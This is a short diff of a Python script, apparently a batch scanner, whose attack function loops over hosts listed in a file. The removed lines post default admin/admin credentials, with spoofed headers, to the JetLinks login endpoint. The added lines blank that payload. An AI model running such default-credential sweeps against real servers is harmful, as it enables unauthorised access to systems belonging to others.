@@ -44,9 +44,9 @@ def attack(captcha):
     for line in open(path+ "\\url.txt", encoding='utf-8'):
         host=str(line).replace('\n','')
         print(host)
-        burp0_url = host + "/jetlinks/authorize/login"
-        burp0_headers = {"Accept": "application/json", "X-Access-Token": "1634639633552", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "Content-Type": "application/json;charset=UTF-8", "Origin": "http://114.116.124.108:9000", "Referer": "http://114.116.124.108:9000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
-        burp0_json={"expires": -1, "password": "admin", "tokenType": "default", "username": "admin", "verifyCode": "", "verifyKey": ""}
+        burp0_url = host + ""
+        burp0_headers = {}
+        burp0_json={}
         try:
             response=session.post(burp0_url, headers=burp0_headers, json=burp0_json)
         except:
